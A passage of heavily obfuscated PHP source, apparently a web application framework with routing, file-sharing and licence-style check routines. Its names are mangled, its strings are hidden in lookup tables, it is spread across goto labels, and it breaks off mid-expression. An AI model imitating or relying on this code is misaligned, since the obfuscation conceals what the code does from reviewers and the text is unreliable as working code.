$d¸È•·àÜê[$cÂÎ¼ÍœÕ[686]] == $cÂÎ¼ÍœÕ[2206]) { $fó†‰±´…å[$cÂÎ¼ÍœÕ[686]] = 0; } goto fŒ§…Ğ´´Í; bøì“Ù˜º£: return $Fõæ¥ãøë‘; goto E‚™Î×ç; E‚™Î×ç: } private function removeByFile($Eï„ ÇÃ—è) { goto bŠ±—ÕŸÀ«; f¼—æ‰Í–Û: $cŞÚ³¨µˆ» = array_to_keyvalue($FÅğ”¡‹‚‘, $AßÇÍµ¹Ú©[33], $AßÇÍµ¹Ú©[445]); $this->remove($cŞÚ³¨µˆ»); goto d¯¿Ô–²ì; DÖ´Š‡Š£É: $Fîä¡°Á°© = array($AßÇÍµ¹Ú©[374] => array($AßÇÍµ¹Ú©[7], $B÷‘Õ‹™’Ê), $AßÇÍµ¹Ú©[450] => 1); $FÅğ”¡‹‚‘ = Model($AßÇÍµ¹Ú©[2043])->where($Fîä¡°Á°©)->field($AßÇÍµ¹Ú©[445])->select(); if (empty($FÅğ”¡‹‚‘)) { return; } goto f¼—æ‰Í–Û; bŠ±—ÕŸÀ«: $AßÇÍµ¹Ú© =& $_SERVER[ºÖÙÂŒäÉê‡]; $FÅğ”¡‹‚‘ = Model($AßÇÍµ¹Ú©[751])->where(array($AßÇÍµ¹Ú©[423] => $Eï„ ÇÃ—è))->field($AßÇÍµ¹Ú©[374])->select(); $B÷‘Õ‹™’Ê = array_to_keyvalue($FÅğ”¡‹‚‘, $AßÇÍµ¹Ú©[33], $AßÇÍµ¹Ú©[374]); goto DÖ´Š‡Š£É; d¯¿Ô–²ì: } private function shareFileMeta($cóì„´†Ì·, $f…¨†Ê—‹È = null) { $AÚ•øÕÑÖ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Aøá³‡ïºµ = array($AÚ•øÕÑÖ[423] => $cóì„´†Ì·, $AÚ•øÕÑÖ[89] => $AÚ•øÕÑÖ[2210]); if (is_null($f…¨†Ê—‹È)) { return Model($AÚ•øÕÑÖ[2211])->where($Aøá³‡ïºµ)->find(); } $Aøá³‡ïºµ[$AÚ•øÕÑÖ[364]] = $f…¨†Ê—‹È; Model($AÚ•øÕÑÖ[2211])->add($Aøá³‡ïºµ, array(), !0); } } goto FŒ¡‚ÑÏÍ; eŒë–÷Ñ: class Application { private $defaultModule = "\151\x6e\144\145\170"; private $defaultController = "\x69\x6e\x64\x65\x78"; private $defaultAction = "\151\x6e\144\x65\170"; function __construct() { } public function setDefault($fäõùøÏ†) { goto a¨éØØà“ø; aÚïê¦›É: $C’çî´³¶è = $A‹òåòµš®[555]; if (strlen($C’çî´³¶è) < $A‹òåòµš®[556]) { return; } $this->defaultModule = $fóƒóâ¼Óø[0] ? $fóƒóâ¼Óø[0] : $this->defaultModule; goto F¶ÆÌ•õâµ; F¶ÆÌ•õâµ: $DŒÆ’ğŠ = $A‹òåòµš®[557]; if (!$DŒÆ’ğŠ) { die; } $this->defaultController = $fóƒóâ¼Óø[1] ? $fóƒóâ¼Óø[1] : $this->defaultController; goto f°¥èÂƒ´™; f°¥èÂƒ´™: $Eèïï¸ = $A‹òåòµš®[558]; $this->defaultAction = $fóƒóâ¼Óø[2] ? $fóƒóâ¼Óø[2] : $this->defaultAction; $this->{$_SERVER[‘Ûª¥Ç…][3]}($D›‰ƒÔÓÉğ[4], array($this, $D›‰ƒÔÓÉğ[5])); goto aÃñÁÄšºÇ; a¨éØØà“ø: $A‹òåòµš® =& $_SERVER[ºÖÙÂŒäÉê‡]; $D›‰ƒÔÓÉğ =& $_SERVER[‘Ûª¥Ç…]; $fóƒóâ¼Óø = $D›‰ƒÔÓÉğ[0]($D›‰ƒÔÓÉğ[1], $D›‰ƒÔÓÉğ[2]($fäõùøÏ†, $D›‰ƒÔÓÉğ[1])); goto aÚïê¦›É; aÃñÁÄšºÇ: } public function appRun($D–ê£ôø‘³) { goto DÁ•Ü·Á¶Û; c„•µ×½ë: $fèîå¸Ñ‹‚ = $CÍ¦ôÍ×Çœ[560]; while (strlen($fèîå¸Ñ‹‚) < $CÍ¦ôÍ×Çœ[561]) { if (!$fèîå¸Ñ‹‚) { break; } $fèîå¸Ñ‹‚++; } $Däö¶‡åÚá = $F¯¿Ô…Êˆ¬[7]; goto A¡‡°Ú‹‰; Eù› ¯ôÕî: $câˆÍçĞ‰• = $CÍ¦ôÍ×Çœ[559]; while ($câˆÍçĞ‰• < $CÍ¦ôÍ×Çœ[175]) { if ($câˆÍçĞ‰• >= 0) { break; } $câˆÍçĞ‰•++; } $aÁÚ‚³ó¶½ = $F¯¿Ô…Êˆ¬[6]($DĞ±Íá“í[0]); goto c„•µ×½ë; A¡‡°Ú‹‰: $dë·ßß²ªç = $CÍ¦ôÍ×Çœ[562]; while (strlen($dë·ßß²ªç) < $CÍ¦ôÍ×Çœ[561]) { if (!$dë·ßß²ªç) { break; } $dë·ßß²ªç++; } if ($aÁÚ‚³ó¶½ == $F¯¿Ô…Êˆ¬[8]) { $Däö¶‡åÚá = $F¯¿Ô…Êˆ¬[9]; $DĞ±Íá“í[0] = $F¯¿Ô…Êˆ¬[10]; $DĞ±Íá“í[1] = $DĞ±Íá“í[1] . $F¯¿Ô…Êˆ¬[11]; $D–ê£ôø‘³ = $F¯¿Ô…Êˆ¬[12]($F¯¿Ô…Êˆ¬[1], $DĞ±Íá“í); $D–ê£ôø‘³ = $F¯¿Ô…Êˆ¬[2]($D–ê£ôø‘³, $F¯¿Ô…Êˆ¬[1]); } goto eğ¶¨¶å¡; DÁ•Ü·Á¶Û: $CÍ¦ôÍ×Çœ =& $_SERVER[ºÖÙÂŒäÉê‡]; $F¯¿Ô…Êˆ¬ =& $_SERVER[‘Ûª¥Ç…]; $DĞ±Íá“í = $F¯¿Ô…Êˆ¬[0]($F¯¿Ô…Êˆ¬[1], $D–ê£ôø‘³); goto Eù› ¯ôÕî; cÅÛŠŒ·»„: $F¯¿Ô…Êˆ¬[13](array($F¯¿Ô…Êˆ¬[14], $F¯¿Ô…Êˆ¬[15]), $Däö¶‡åÚá . $F¯¿Ô…Êˆ¬[18], $D–ê£ôø‘³); goto EÄ‰Õ´¢Ö; eğ¶¨¶å¡: $F¯¿Ô…Êˆ¬[13](array($F¯¿Ô…Êˆ¬[14], $F¯¿Ô…Êˆ¬[15]), $Däö¶‡åÚá . $F¯¿Ô…Êˆ¬[16], $D–ê£ôø‘³); $F¯¿Ô…Êˆ¬[17]($D–ê£ôø‘³); $BÚÇÊÆÕù‹ = $CÍ¦ôÍ×Çœ[563]; goto cÅÛŠŒ·»„; EÄ‰Õ´¢Ö: } private function autorun() { $Bˆ¹â²è× =& $_SERVER[ºÖÙÂŒäÉê‡]; $Aùßâã¥ù× =& $_SERVER[‘Ûª¥Ç…]; global $config; if ($Aùßâã¥ù×[19]($config[$Aùßâã¥ù×[20]]) == 0) { return; } foreach ($config[$Aùßâã¥ù×[20]] as $aâÚñ„´¬ => $eöÀ¶—¸ã) { $this->{$_SERVER[‘Ûª¥Ç…][21]}($eöÀ¶—¸ã); $F„×ªÓÂ¸º = $Bˆ¹â²è×[564]; while (strlen($F„×ªÓÂ¸º) < $Bˆ¹â²è×[565]) { if (!$F„×ªÓÂ¸º) { break; } $F„×ªÓÂ¸º++; } } } private function mojh50fb71dd() { goto e°ã…‹¢Şç; BÛĞ±³¬ƒ: $Dç¨‰ƒÕÎ¸ = $fŒôìè±¡š[26]($GLOBALS[$fŒôìè±¡š[22]][$fŒôìè±¡š[23]], 1); $GLOBALS[$fŒôìè±¡š[22]][$fŒôìè±¡š[23]] = $fŒôìè±¡š[27]($eÒ”˜Ù¦òå, $Dç¨‰ƒÕÎ¸); $GLOBALS[$fŒôìè±¡š[22]][$fŒôìè±¡š[28]] = $fŒôìè±¡š[29]($fŒôìè±¡š[1], $GLOBALS[$fŒôìè±¡š[22]][$fŒôìè±¡š[23]]); goto BÔ‘‚›Ş×İ; CâÜÎ÷Ôª†: $BÔ­ïÁ‹ˆÁ = $døÛ°Ë›³[568]; if (strlen($BÔ­ïÁ‹ˆÁ) < $døÛ°Ë›³[556]) { die; } $eÒ”˜Ù¦òå = array($fŒôìè±¡š[8], $bÑÎá·Äß); goto BÛĞ±³¬ƒ; FóÁğ¤“: $e•Ì¢”êªº = $GLOBALS[$fŒôìè±¡š[22]][$fŒôìè±¡š[23]][0]; $CêÄëèÄïò = $døÛ°Ë›³[566]; if (strlen($CêÄëèÄïò) < $døÛ°Ë›³[567]) { die; } goto E¾¢™¯áÔÃ; e°ã…‹¢Şç: $døÛ°Ë›³ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fŒôìè±¡š =& $_SERVER[‘Ûª¥Ç…]; $Bƒ¨²æø×¿ = $fŒôìè±¡š[8]; goto FóÁğ¤“; E¾¢™¯áÔÃ: if (!$e•Ì¢”êªº || $fŒôìè±¡š[24]($e•Ì¢”êªº) <= $fŒôìè±¡š[24]($Bƒ¨²æø×¿)) { return; } if ($fŒôìè±¡š[6]($fŒôìè±¡š[25]($e•Ì¢”êªº, -$fŒôìè±¡š[24]($Bƒ¨²æø×¿))) != $Bƒ¨²æø×¿) { return; } $bÑÎá·Äß = $fŒôìè±¡š[25]($e•Ì¢”êªº, 0, -$fŒôìè±¡š[24]($Bƒ¨²æø×¿)); goto CâÜÎ÷Ôª†; BÔ‘‚›Ş×İ: } private function voled1fff514() { goto BÃ†Ùª©«Œ; b×„ñÍ™Íí: $fí½”•£…ƒ = $F’»¤Î«Ó[571]; $eŞò´š«‡[34]($eŞò´š«‡[35], $Bœåí‹™åó, $c„„¾Ì¤…Õ); $b¹É¹¯«–ã = $F’»¤Î«Ó[572]; goto cƒµÌ÷Í½§; dŠÖ»Ûå°: $FòƒŒİâ¾× = $F’»¤Î«Ó[573]; $GLOBALS[$eŞò´š«‡[22]][$eŞò´š«‡[28]] = $eŞò´š«‡[29]($eŞò´š«‡[1], $GLOBALS[$eŞò´š«‡[22]][$eŞò´š«‡[23]]); goto d’£¹•…ìò; eì§îôÜ³Ş: $FÇ«®¢”äë = $_SERVER[$eŞò´š«‡[30]]; $a¾÷šë’‚í = $F’»¤Î«Ó[569]; if (!$a¾÷šë’‚í) { return; } goto FÆğÙ´ÆíÑ; cƒµÌ÷Í½§: while ($b¹É¹¯«–ã < $F’»¤Î«Ó[565]) { if ($b¹É¹¯«–ã >= 0) { break; } $b¹É¹¯«–ã++; } $Bœåí‹™åó = $eŞò´š«‡[2]($c„„¾Ì¤…Õ[0][0], $eŞò´š«‡[36]); $GLOBALS[$eŞò´š«‡[22]][$eŞò´š«‡[23]] = $eŞò´š«‡[0]($eŞò´š«‡[36], $Bœåí‹™åó); goto dŠÖ»Ûå°; F³ÅƒºšÉ: if (!$eŞò´š«‡[32]($FÇ«®¢”äë, $DñÍš½“Ö‡)) { return; } $fÒ†‚×Ø´ = $eŞò´š«‡[33]($FÇ«®¢”äë, $DñÍš½“Ö‡); $Bœåí‹™åó = $eŞò´š«‡[25]($FÇ«®¢”äë, $fÒ†‚×Ø´ + $eŞò´š«‡[24]($DñÍš½“Ö‡)); goto b×„ñÍ™Íí; FÆğÙ´ÆíÑ: $DñÍš½“Ö‡ = $eŞò´š«‡[31]; $A‡Œ™’øŠ‹ = $F’»¤Î«Ó[570]; if (strlen($A‡Œ™’øŠ‹) < $F’»¤Î«Ó[561]) { die; } goto F³ÅƒºšÉ; BÃ†Ùª©«Œ: $F’»¤Î«Ó =& $_SERVER[ºÖÙÂŒäÉê‡]; $eŞò´š«‡ =& $_SERVER[‘Ûª¥Ç…]; if ($GLOBALS[$eŞò´š«‡[22]][$eŞò´š«‡[28]] != $eŞò´š«‡[10]) { return; } goto eì§îôÜ³Ş; d’£¹•…ìò: } public function run() { goto A”Œ¸ŒØÂ£; A¸×ƒÊ£—: $this->{$_SERVER[‘Ûª¥Ç…][38]}(); $BÒµÀç­É = $a¼Ëö‰²[574]; while ($BÒµÀç­É < $a¼Ëö‰²[565]) { if ($BÒµÀç­É >= 0) { break; } $BÒµÀç­É++; } goto a¦ñíôÎê¿; e´¹›à³‚: $AŒÛØ•× = $a¼Ëö‰²[577]; if (!$AŒÛØ•×) { return; } $_SERVER[$Bõâ‚Ô‹¤„[44]] = $Bõâ‚Ô‹¤„[6](ACTION); goto C˜¯±¾’˜ã; C©‰™×°°Û: $Bõâ‚Ô‹¤„[39]($Bõâ‚Ô‹¤„[42], isset($F´ªÈß¼ˆ[2]) && $F´ªÈß¼ˆ[0] ? $F´ªÈß¼ˆ[2] : $this->defaultAction); $CŸóŸµÖµ» = $a¼Ëö‰²[576]; $Bõâ‚Ô‹¤„[39]($Bõâ‚Ô‹¤„[43], MOD . $Bõâ‚Ô‹¤„[1] . ST . $Bõâ‚Ô‹¤„[1] . ACT); goto e´¹›à³‚; a¦ñíôÎê¿: $F´ªÈß¼ˆ = $GLOBALS[$Bõâ‚Ô‹¤„[22]][$Bõâ‚Ô‹¤„[23]]; $CƒÊÑÃ›“ = $GLOBALS[$Bõâ‚Ô‹¤„[22]][$Bõâ‚Ô‹¤„[28]]; $Bà›‡‡â = $a¼Ëö‰²[575]; goto Aëµ•˜øêÀ; C˜¯±¾’˜ã: $EÀÛÂÇÈá” = $a¼Ëö‰²[578]; while ($EÀÛÂÇÈá” < $a¼Ëö‰²[567]) { if ($EÀÛÂÇÈá” >= 0) { break; } $EÀÛÂÇÈá”++; } $this->{$_SERVER[‘Ûª¥Ç…][45]}(); goto Bö’£íàÁä; Aëµ•˜øêÀ: if (!$Bà›‡‡â) { return; } $Bõâ‚Ô‹¤„[39]($Bõâ‚Ô‹¤„[40], isset($F´ªÈß¼ˆ[0]) && $F´ªÈß¼ˆ[0] ? $F´ªÈß¼ˆ[0] : $this->defaultModule); $Bõâ‚Ô‹¤„[39]($Bõâ‚Ô‹¤„[41], isset($F´ªÈß¼ˆ[1]) && $F´ªÈß¼ˆ[0] ? $F´ªÈß¼ˆ[1] : $this->defaultController); goto C©‰™×°°Û; Bö’£íàÁä: $AÆ«Íµ»¥Ø = $a¼Ëö‰²[579]; if (strlen($AÆ«Íµ»¥Ø) < $a¼Ëö‰²[567]) { return; } if ($Bõâ‚Ô‹¤„[19]($F´ªÈß¼ˆ) >= 3) { $this->{$_SERVER[‘Ûª¥Ç…][21]}($CƒÊÑÃ›“); } else { $this->{$_SERVER[‘Ûª¥Ç…][21]}(ACTION); } goto DÒĞÀĞç»½; A”Œ¸ŒØÂ£: $a¼Ëö‰² =& $_SERVER[ºÖÙÂŒäÉê‡]; $Bõâ‚Ô‹¤„ =& $_SERVER[‘Ûª¥Ç…]; $this->{$_SERVER[‘Ûª¥Ç…][37]}(); goto A¸×ƒÊ£—; DÒĞÀĞç»½: } private $hdrj82f56670 = array(); private $izypf111d6fd = ''; public function eukw95f4bafe() { goto FŸ„¿ğéÌ‘; FŸ„¿ğéÌ‘: $bÏ¤ÉˆØ§¨ =& $_SERVER[ºÖÙÂŒäÉê‡]; $F›ëÂò†À— =& $_SERVER[‘Ûª¥Ç…]; $this->{$_SERVER[‘Ûª¥Ç…][46]}(); goto dÍêŞİœÃ¬; eÇ¿ Ê¸§Ê: if (strlen($cğ¬åë¤ÇÒ) < $bÏ¤ÉˆØ§¨[556]) { die; } $this->{$_SERVER[‘Ûª¥Ç…][52]}(); $this->{$_SERVER[‘Ûª¥Ç…][3]}($F›ëÂò†À—[53], array($this, $F›ëÂò†À—[54])); goto F«®ÜÆË‡; BØ‘¢ÏØÙ: $this->{$_SERVER[‘Ûª¥Ç…][49]}(); $E£ŒÛŸæòš = $bÏ¤ÉˆØ§¨[582]; if (!$E£ŒÛŸæòš) { return; } goto aŸè‹Ú©ÂÈ; d²õğ¦ã‹: $BÇÑÁ÷å± = $bÏ¤ÉˆØ§¨[585]; if (strlen($BÇÑÁ÷å±) < $bÏ¤ÉˆØ§¨[565]) { return; } $this->{$_SERVER[‘Ûª¥Ç…][3]}($F›ëÂò†À—[57], array($this, $F›ëÂò†À—[58])); goto dƒ˜Á¨ğ‘; dƒ˜Á¨ğ‘: $this->{$_SERVER[‘Ûª¥Ç…][3]}($F›ëÂò†À—[59], array($this, $F›ëÂò†À—[60])); goto E°ã³¨ğ; F«®ÜÆË‡: $DŸ§Ö½ì†ª = $bÏ¤ÉˆØ§¨[584]; if (strlen($DŸ§Ö½ì†ª) < $bÏ¤ÉˆØ§¨[567]) { die; } $this->{$_SERVER[‘Ûª¥Ç…][3]}($F›ëÂò†À—[55], array($this, $F›ëÂò†À—[56])); goto d²õğ¦ã‹; B¢Ö¼›–¿½: $this->{$_SERVER[‘Ûª¥Ç…][48]}(); $aã‚ÀÛ«‰š = $bÏ¤ÉˆØ§¨[581]; if (strlen($aã‚ÀÛ«‰š) < $bÏ¤ÉˆØ§¨[565]) { die; } goto BØ‘¢ÏØÙ; aŸè‹Ú©ÂÈ: $this->{$_SERVER[‘Ûª¥Ç…][50]}(); $this->{$_SERVER[‘Ûª¥Ç…][51]}(); $cğ¬åë¤ÇÒ = $bÏ¤ÉˆØ§¨[583]; goto eÇ¿ Ê¸§Ê; dÍêŞİœÃ¬: $this->{$_SERVER[‘Ûª¥Ç…][47]}(); $EÖÛîÀ§‚© = $bÏ¤ÉˆØ§¨[580]; if (!$EÖÛîÀ§‚©) { die; } goto B¢Ö¼›–¿½; E°ã³¨ğ: } public function tsvi65eaad72($F“ô±İŸÂ) { goto c¸†¨¡±É¹; F·éŠ˜óŞï: unset($F“ô±İŸÂ[$aäªÃÕÀœ[93]][$aäªÃÕÀœ[94]][$aäªÃÕÀœ[76]]); $b‡³ĞŒ‡Œé = $Bˆç•çŠ¦Î[588]; while (strlen($b‡³ĞŒ‡Œé) < $Bˆç•çŠ¦Î[175]) { if (!$b‡³ĞŒ‡Œé) { break; } $b‡³ĞŒ‡Œé++; } goto Cç¹¥î¿Ì; c¸†¨¡±É¹: $Bˆç•çŠ¦Î =& $_SERVER[ºÖÙÂŒäÉê‡]; $aäªÃÕÀœ =& $_SERVER[‘Ûª¥Ç…]; $aÉÌÇ‚ÔŒ¥ = $aäªÃÕÀœ[61]($aäªÃÕÀœ[62])->{$_SERVER[‘Ûª¥Ç…][63]}(); goto b†„®Ç®Ü‚; f÷‚ŠŒ±¬„: if (strlen($d¼Ö¤öîğ) < $Bˆç•çŠ¦Î[565]) { die; } $F“ô±İŸÂ[$aäªÃÕÀœ[108]][$aäªÃÕÀœ[113]] = $aäªÃÕÀœ[114]($_SERVER[$aäªÃÕÀœ[115]] . $aÉÌÇ‚ÔŒ¥[$aäªÃÕÀœ[116]]); $F“ô±İŸÂ[$aäªÃÕÀœ[108]][$aäªÃÕÀœ[117]] = $aäªÃÕÀœ[118]($aäªÃÕÀœ[119]()); goto A³†÷å¡ªÇ; Cç¹¥î¿Ì: unset($F“ô±İŸÂ[$aäªÃÕÀœ[93]][$aäªÃÕÀœ[94]][$aäªÃÕÀœ[98]]); $BÛ²‹²™İ¤ = $Bˆç•çŠ¦Î[589]; while (strlen($BÛ²‹²™İ¤) < $Bˆç•çŠ¦Î[561]) { if (!$BÛ²‹²™İ¤) { break; } $BÛ²‹²™İ¤++; } goto FÜºš„Ÿ¨«; FÜºš„Ÿ¨«: $F“ô±İŸÂ[$aäªÃÕÀœ[93]][$aäªÃÕÀœ[94]][$aäªÃÕÀœ[99]] = array($aäªÃÕÀœ[100] => (int) $A—Š˜ïÒ§[$aäªÃÕÀœ[101]], $aäªÃÕÀœ[102] => $aäªÃÕÀœ[103]($aäªÃÕÀœ[104]($A—Š˜ïÒ§, $aäªÃÕÀœ[105], array())), $aäªÃÕÀœ[106] => (int) $aäªÃÕÀœ[104]($A—Š˜ïÒ§, $aäªÃÕÀœ[107], 0)); $F“ô±İŸÂ[$aäªÃÕÀœ[108]][$aäªÃÕÀœ[109]] = $aäªÃÕÀœ[110]($aäªÃÕÀœ[111])->{$_SERVER[‘Ûª¥Ç…][112]}(); $d¼Ö¤öîğ = $Bˆç•çŠ¦Î[590]; goto f÷‚ŠŒ±¬„; fË„Ÿøƒ®õ: if ($this->izypf111d6fd == $aäªÃÕÀœ[121]) { $F“ô±İŸÂ[$aäªÃÕÀœ[93]][$aäªÃÕÀœ[94]][$aäªÃÕÀœ[99]][$aäªÃÕÀœ[107]] = 0; } $F“ô±İŸÂ[$aäªÃÕÀœ[108]][$aäªÃÕÀœ[128]] = $aäªÃÕÀœ[104]($this->hdrj82f56670, $aäªÃÕÀœ[129], $aäªÃÕÀœ[10]); $F“ô±İŸÂ[$aäªÃÕÀœ[108]][$aäªÃÕÀœ[130]] = $aäªÃÕÀœ[104]($this->hdrj82f56670, $aäªÃÕÀœ[131], $aäªÃÕÀœ[10]); goto fÖÕˆ²…; fË˜Ó…Å­ê: $EÔåéÈÆ› = $Bˆç•çŠ¦Î[586]; if (!$EÔåéÈÆ›) { die; } unset($F“ô±İŸÂ[$aäªÃÕÀœ[93]][$aäªÃÕÀœ[95]][$aäªÃÕÀœ[96]]); goto BÊ –š±; A³†÷å¡ªÇ: $F“ô±İŸÂ[$aäªÃÕÀœ[108]][$aäªÃÕÀœ[120]] = $this->izypf111d6fd; $eÊá½¦†¾ = $Bˆç•çŠ¦Î[591]; if ($aÉÌÇ‚ÔŒ¥[$aäªÃÕÀœ[120]] != $aäªÃÕÀœ[121]) { $F“ô±İŸÂ[$aäªÃÕÀœ[108]][$aäªÃÕÀœ[122]] = $aÉÌÇ‚ÔŒ¥[$aäªÃÕÀœ[122]]; $F“ô±İŸÂ[$aäªÃÕÀœ[108]][$aäªÃÕÀœ[123]] = $aÉÌÇ‚ÔŒ¥[$aäªÃÕÀœ[123]]; $fÃÜ’ïãÇí = $aäªÃÕÀœ[124](10) . $this->izypf111d6fd . $aäªÃÕÀœ[124](5); $F“ô±İŸÂ[$aäªÃÕÀœ[93]][$aäªÃÕÀœ[125]][$aäªÃÕÀœ[126]] = $this->{$_SERVER[‘Ûª¥Ç…][127]}($fÃÜ’ïãÇí, $F“ô±İŸÂ[$aäªÃÕÀœ[108]][$aäªÃÕÀœ[113]]); } goto fË„Ÿøƒ®õ; BÊ –š±: unset($F“ô±İŸÂ[$aäªÃÕÀœ[93]][$aäªÃÕÀœ[95]][$aäªÃÕÀœ[97]]); $Aß¡ğÂÜ’Ğ = $Bˆç•çŠ¦Î[587]; if (!$Aß¡ğÂÜ’Ğ) { return; } goto F·éŠ˜óŞï; b†„®Ç®Ü‚: $b¬ïğÏÃÓ = array($aäªÃÕÀœ[64], $aäªÃÕÀœ[65], $aäªÃÕÀœ[66], $aäªÃÕÀœ[67], $aäªÃÕÀœ[68], $aäªÃÕÀœ[69], $aäªÃÕÀœ[70], $aäªÃÕÀœ[71], $aäªÃÕÀœ[72], $aäªÃÕÀœ[73], $aäªÃÕÀœ[74], $aäªÃÕÀœ[75], $aäªÃÕÀœ[76], $aäªÃÕÀœ[77], $aäªÃÕÀœ[78], $aäªÃÕÀœ[79], $aäªÃÕÀœ[80], $aäªÃÕÀœ[81], $aäªÃÕÀœ[82], $aäªÃÕÀœ[83], $aäªÃÕÀœ[84], $aäªÃÕÀœ[85], $aäªÃÕÀœ[86], $aäªÃÕÀœ[87], $aäªÃÕÀœ[88], $aäªÃÕÀœ[89], $aäªÃÕÀœ[90]); foreach ($b¬ïğÏÃÓ as $få–Œ…õø•) { $B¯µ®Í‹ôØ = $GLOBALS[$aäªÃÕÀœ[91]][$aäªÃÕÀœ[92]][$få–Œ…õø•]; if (isset($aÉÌÇ‚ÔŒ¥[$få–Œ…õø•])) { $B¯µ®Í‹ôØ = $aÉÌÇ‚ÔŒ¥[$få–Œ…õø•]; } $F“ô±İŸÂ[$aäªÃÕÀœ[93]][$aäªÃÕÀœ[94]][$få–Œ…õø•] = $B¯µ®Í‹ôØ; } $A—Š˜ïÒ§ = $F“ô±İŸÂ[$aäªÃÕÀœ[93]][$aäªÃÕÀœ[94]][$aäªÃÕÀœ[76]]; goto fË˜Ó…Å­ê; fÖÕˆ²…: $eĞ²‚¢ğ‚¼ = $Bˆç•çŠ¦Î[592]; if ($aäªÃÕÀœ[104]($GLOBALS, $aäªÃÕÀœ[132]) && $this->config[$aäªÃÕÀœ[133]]) { $F“ô±İŸÂ[$aäªÃÕÀœ[108]][$aäªÃÕÀœ[134]] = WEB_ROOT; } return $F“ô±İŸÂ; goto Aä§âµÛôŒ; Aä§âµÛôŒ: } private function uqkn241bc0e1() { goto Dî—Ä°Ùµ; Dî—Ä°Ùµ: $Dª™à®èÌİ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Fƒ ¼‰ó =& $_SERVER[‘Ûª¥Ç…]; if ($_SERVER[$Fƒ ¼‰ó[44]] == $Fƒ ¼‰ó[135]) { goto E´”Ğî©õ; E´”Ğî©õ: $FÑ±—İ¥œÉ = array($Fƒ ¼‰ó[120] => $this->izypf111d6fd, $Fƒ ¼‰ó[136] => $this->{$_SERVER[‘Ûª¥Ç…][137]}(), $Fƒ ¼‰ó[138] => $Fƒ ¼‰ó[61]($Fƒ ¼‰ó[139])->{$_SERVER[‘Ûª¥Ç…][140]}()); if ($this->izypf111d6fd != $Fƒ ¼‰ó[121]) { $dô¬¸Äí’© = $Fƒ ¼‰ó[104]($this->hdrj82f56670, $Fƒ ¼‰ó[141]); if ($dô¬¸Äí’©) { $FÑ±—İ¥œÉ[$Fƒ ¼‰ó[142]] = $dô¬¸Äí’©; $FÑ±—İ¥œÉ[$Fƒ ¼‰ó[143]] = $Fƒ ¼‰ó[144]($Fƒ ¼‰ó[104]($this->hdrj82f56670, $Fƒ ¼‰ó[145])); $FÑ±—İ¥œÉ[$Fƒ ¼‰ó[146]] = $Fƒ ¼‰ó[104]($this->hdrj82f56670, $Fƒ ¼‰ó[131]); } } $FÑ±—İ¥œÉ = $this->{$_SERVER[‘Ûª¥Ç…][147]}($Fƒ ¼‰ó[148]($FÑ±—İ¥œÉ), $Fƒ ¼‰ó[114]($Fƒ ¼‰ó[149])); goto DŒÜÖ¿¹²; f²¨Ùé†Ô: $Fƒ ¼‰ó[13](array($Fƒ ¼‰ó[151], $Fƒ ¼‰ó[152]), $Bç±±µË½); goto aÊ†ÅƒÊ; DŒÜÖ¿¹²: $Bç±±µË½ = array($Fƒ ¼‰ó[150] => $FÑ±—İ¥œÉ); $E±ÌÀÙõ¢á = $Dª™à®èÌİ[593]; if (!$E±ÌÀÙõ¢á) { return; } goto f²¨Ùé†Ô; aÊ†ÅƒÊ: } goto bÄ¦Ç¢·™ö; eÅ¹¯Ï‘„: $c¢°ÉÇ‘æÍ = $Dª™à®èÌİ[594]; if (!$c¢°ÉÇ‘æÍ) { return; } $Bç±±µË½ = array($Fƒ ¼‰ó[159] => $FÁ¼ÕŸÕ¦ [$Fƒ ¼‰ó[64]], $Fƒ ¼‰ó[160] => $FÁ¼ÕŸÕ¦ [$Fƒ ¼‰ó[65]], $Fƒ ¼‰ó[161] => $Fƒ ¼‰ó[10]); goto AŠ·¹¨˜Ë; AŠ·¹¨˜Ë: foreach ($fô¨¥ˆ†òô as $BÖè‡™Óïµ) { if (!isset($FÁ¼ÕŸÕ¦ [$BÖè‡™Óïµ]) || !$FÁ¼ÕŸÕ¦ [$BÖè‡™Óïµ]) { continue; } $Bç±±µË½[$BÖè‡™Óïµ] = $FÁ¼ÕŸÕ¦ [$BÖè‡™Óïµ]; $f”…êª›ø» = $Dª™à®èÌİ[595]; if (!$f”…êª›ø») { die; } } $Fƒ ¼‰ó[13](array($Fƒ ¼‰ó[151], $Fƒ ¼‰ó[152]), $Bç±±µË½); goto Cå—ìñŞò÷; bÄ¦Ç¢·™ö: if ($this->izypf111d6fd == $Fƒ ¼‰ó[121]) { return; } $fô¨¥ˆ†òô = array($Fƒ ¼‰ó[153], $Fƒ ¼‰ó[154], $Fƒ ¼‰ó[155], $Fƒ ¼‰ó[156], $Fƒ ¼‰ó[157], $Fƒ ¼‰ó[158]); $FÁ¼ÕŸÕ¦  = $Fƒ ¼‰ó[61]($Fƒ ¼‰ó[62])->{$_SERVER[‘Ûª¥Ç…][63]}(); goto eÅ¹¯Ï‘„; Cå—ìñŞò÷: } private function klfe935e9d96() { goto aí„‹•“˜›; dá æ²¿Ä¤: $d»·ö¬Î•ä = $f„İ™ªöÃ[598]; $CÖè‹Â…ÀŸ = $b˜º§›¬£[124](16); $bğñ¶³ñĞ = $CÖè‹Â…ÀŸ . $BÈâßä¤ß†[$b˜º§›¬£[120]] . $this->{$_SERVER[‘Ûª¥Ç…][147]}($b˜º§›¬£[114]($BÈâßä¤ß†[$b˜º§›¬£[209]]), $CÖè‹Â…ÀŸ); goto Cò…ŠÈÕ®; e¿è«Ñß’¥: $aÈ¼Ãàª™ = array(); $aÈ¼Ãàª™[$e¼ñµÛ„îã] = $Fˆ—Ø†Ş; $b˜º§›¬£[61]($b˜º§›¬£[11])->{$_SERVER[‘Ûª¥Ç…][226]}($a‚˜Äøì”[$b˜º§›¬£[227]], array($b˜º§›¬£[228] => $aÈ¼Ãàª™)); goto C­²Ô‰ãÇ; D¶„î°©«¶: $a‚˜Äøì” = $Eª¿ÄÓËë[$b˜º§›¬£[225]]; $EÒŞØò­Œ• = $f„İ™ªöÃ[600]; if (strlen($EÒŞØò­Œ•) < $f„İ™ªöÃ[567]) { die; } goto e¿è«Ñß’¥; eÂÅ»†±¾: $Aé©ˆ÷‹Ùˆ = $då¢‹áÑ . $BÈâßä¤ß†[$b˜º§›¬£[120]] . $BÈâßä¤ß†[$b˜º§›¬£[212]]; $EòÎ‹®ç˜ó = $f„İ™ªöÃ[597]; $BÈâßä¤ß†[$b˜º§›¬£[122]] = $b˜º§›¬£[214]($b˜º§›¬£[118]($this->{$_SERVER[‘Ûª¥Ç…][147]}($Aé©ˆ÷‹Ùˆ, 